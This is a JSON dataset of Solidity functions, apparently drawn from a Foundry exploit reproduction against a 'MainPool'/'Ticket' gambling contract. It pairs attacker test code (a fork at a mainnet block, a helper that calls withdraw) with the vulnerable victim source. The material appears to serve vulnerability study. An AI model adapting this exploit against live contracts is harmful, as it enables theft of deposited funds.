[
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "startwith",
    "original_code": "    function startwith() external {\n        mainpool.withdraw();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 19_138_640);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testexploit",
    "original_code": "    function testexploit() public payable {\n        Helper = new Help{value: 18 ether}();\n\n        WETH.approve(address(mainpool), 18 ether);\n        WETH.approve(address(tick), 18 ether);\n        WETH.approve(address(Helper), 18 ether);\n\n        Helper.startwith();\n        emit log_named_decimal_uint(\"Attacker WETH balance after exploit\", address(Helper).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "calcStepIncome",
    "original_code": "    function calcStepIncome(uint256 pid_,uint256 value_,uint8 dividendAccount_) public{\n    \n        \n            uint256    spIncome = (value_*dividendAccount_)/100;\n                if(plyr[RID][pid_].totalSettled >= playBiggertReward[RID][pid_]){\n                    return;\n                }\n                if(plyr[RID][pid_].totalSettled+spIncome>playBiggertReward[RID][pid_]){\n                    spIncome = playBiggertReward[RID][pid_]-plyr[RID][pid_].totalSettled;\n                }\n                //if(mainPoolBalance[RID] > spIncome){\n                    plyr[RID][pid_].stepIncome += spIncome;\n                    //plyBalance[RID][pid_] += spIncome;\n                    plyr[RID][pid_].totalSettled += spIncome;\n                    mainPoolBalance[RID] -= spIncome;\n                /*}else{\n                    \n                    plyr[RID][pid_].stepIncome += mainPoolBalance[RID];\n                    //plyBalance[RID][pid_] += mainPoolBalance[RID];\n                    plyr[RID][pid_].totalSettled += mainPoolBalance[RID];\n                    mainPoolBalance[RID] =0;\n                }*/\n            \n        \n        \n    }\n    \n    \n",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "getMainPoolWithdrawBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "getRID",
    "original_code": "    function getRID() public view returns(uint256 rid_){\n        rid_ = RID;\n    }\n    \n    \n",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "joinGame",
    "original_code": "    function joinGame(address parentAddr) public payable notContract(msg.sender){\n        // check ticket\n        uint256 tmPid = plyrID[msg.sender];\n        if(tmPid ==0){\n            require(msg.sender != parentAddr,\"parent same as msg sender\");\n        }\n        require(checkTicket(msg.sender,msg.value),\"check ticket fail\");\n        \n        // check invite\n        uint256 pID =plyrID[msg.sender];\n        \n        uint256 parentPid_ = plyrID[parentAddr];\n        uint256 inBalance = plyr[RID][pID].ticketInCost;\n        \n        allInBalance[RID] += inBalance;\n        \n        if(tmPid == 0 && !vipPly[msg.sender]){\n            plyRShip[pID].parentPID = parentPid_;\n            // topPID\n            if(parentPid_ == 0){\n                plyRShip[pID].topPID = pID;\n            }else{\n                plyRShip[pID].topPID = plyRShip[parentPid_].topPID;\n            }\n        }\n        \n        /*if(plyr[RID][parentPid_].lastCalcDITime == 0){\n            plyr[RID][parentPid_].lastCalcDITime = now;\n        }*/\n        \n        if (RID > 1 && !vipPly[msg.sender] && !vipPlayerID[parentPid_]){\n            activeParent(pID,parentPid_,plyr[RID][pID].ticketInCost);\n        } \n    \n        // the pool  5% for insurance pool\n        if(insePoolBalance[RID] >= 50000*10**18){\n           mainPoolBalance[RID] += inBalance; \n           mainPoolLockBal[RID] += inBalance;\n           mainPoolWithdrawBalance[RID] += inBalance;\n        }else{\n            uint256 temp = inBalance*95/100;\n            insePoolBalance[RID] += inBalance*5/100;\n            mainPoolBalance[RID] += temp;\n            mainPoolLockBal[RID] += temp;\n            mainPoolWithdrawBalance[RID] += temp;\n        }\n        \n        \n    \n        // find parents calc earn\n        calcEarn(pID,inBalance);\n        \n        //check pool state\n        setRoundInfo(pID);\n        \n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "mainPoolWithdrawBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "plyr",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "plyrID",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MainPool",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw() public{\n        //check ADC \n        uint256 pid = plyrID[msg.sender];\n        uint256 bunlers = 0;\n        //if(pid > 11){\n            require(plyr[RID][pid].isActive,\"ply not active\");\n        //}\n        require(mainPoolWithdrawBalance[RID]>0,\"pool not withdraw balance\");\n        if(RID > 1 && !plyr[RID-1][pid].isAlreadGetIns){\n            //check last round \n            if(luckPID[RID-1][pid]&& insePoolBalance[RID-1] > 0 ){\n                if(pid == round[RID-1].plyInList[round[RID-1].fritInsePoint]){\n                    bunlers = round[RID-1].fritInseAmount;\n                    insePoolBalance[RID-1] -= bunlers;\n                }else{\n                    bunlers = plyr[RID-1][pid].ticketInCost*2;\n                    if(bunlers > insePoolBalance[RID-1]){\n                        insePoolBalance[RID-1] = 0;\n                        bunlers = insePoolBalance[RID-1] ;\n                    }else{\n                        insePoolBalance[RID-1] -= bunlers;\n                    }\n                    \n                }\n                \n                mainPoolBalance[RID] -= bunlers;\n                plyr[RID-1][pid].isAlreadGetIns = true;\n                plyLucklyAmount[RID-1][pid] = bunlers;\n            }\n        }/*else{\n            require(plyWithdrawBalance[RID][pid] <= plyBalance[RID][pid],\"not enought balance can withdraw\");\n        }*/\n        \n        uint256 wdBalance;\n        if(plyr[RID][pid].totalSettled>plyWithdrawBalance[RID][pid] ){\n            wdBalance = plyr[RID][pid].totalSettled-plyWithdrawBalance[RID][pid] ;\n        }\n        if(bunlers == 0){\n            require(wdBalance > 0,\"not enought balance can withdraw\");\n        }\n        \n        \n        uint256 totalWdBal = wdBalance + bunlers;\n        //wdBalance += bunlers;\n        if(totalWdBal > mainPoolWithdrawBalance[RID]){\n            totalWdBal = mainPoolWithdrawBalance[RID];\n        }\n        uint256 disAmount  = tickect.calDeductionADC(totalWdBal,false);\n        require(adcERC20.balanceOf(msg.sender)>disAmount,\"not adc to buy out tikcet\");\n        adcERC20.distroy(msg.sender,disAmount);\n        playDistroyADC[pid] += disAmount;\n        totalDistroyADC += disAmount;\n        if(totalWdBal >= mainPoolWithdrawBalance[RID]){\n            mainPoolWithdrawBalance[RID] = 0;\n            plyr[RID][pid].withdrawAmount += mainPoolWithdrawBalance[RID];\n            alreadyWithDrawBal[RID] += mainPoolWithdrawBalance[RID];\n            msg.sender.transfer(mainPoolWithdrawBalance[RID]);\n            \n        }else{\n            mainPoolWithdrawBalance[RID] -= totalWdBal;\n            plyr[RID][pid].withdrawAmount += wdBalance;\n            alreadyWithDrawBal[RID] += totalWdBal;\n            msg.sender.transfer(totalWdBal);\n            \n        }\n        \n        plyWithdrawBalance[RID][pid] += wdBalance;\n        \n        plyr[RID][pid].staticIncome = 0;\n        plyr[RID][pid].dynamicIncome = 0;\n        plyr[RID][pid].stepIncome = 0;\n        ambRewardBalance[RID][pid] = 0;\n        plydV6Income[RID][pid] = 0;\n    }\n    \n    // settlement Static income by web\n",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "buyADC",
    "original_code": "    function buyADC() public payable{\n        uint256 msgValue = msg.value;\n        uint256 adcAmount;\n        uint256 saleADC;\n        \n        if(!fristTime){\n            tokenADC.ticketGet();\n            fristTime = true;\n        }\n        require(msgValue >= minInPay,\" value to smail buyADC\");\n        require((totalBalance-totalCheckOut) == tokenADC.balanceOf(address(this)),\"balance not right\");\n        \n        saleADC = (msgValue* changeRatio[curentLevel])/10**18; //msgValue.div(10**18).mul(changeRatio[curentLevel]);\n        \n        teamAddr.transfer(msgValue);\n        adcAmount = CrossLevel(saleADC,msgValue);\n        \n        tokenADC.transfer(msg.sender,adcAmount);\n        \n        if(msgValue >= 100*10**18){\n            mPoolInterface(addrM.getAddr(\"MAINPOOL\")).setAmbFlag(msg.sender);\n        }\n        \n        totalCheckOut += adcAmount;\n        \n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ticket",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "",
    "description": ""
  }
]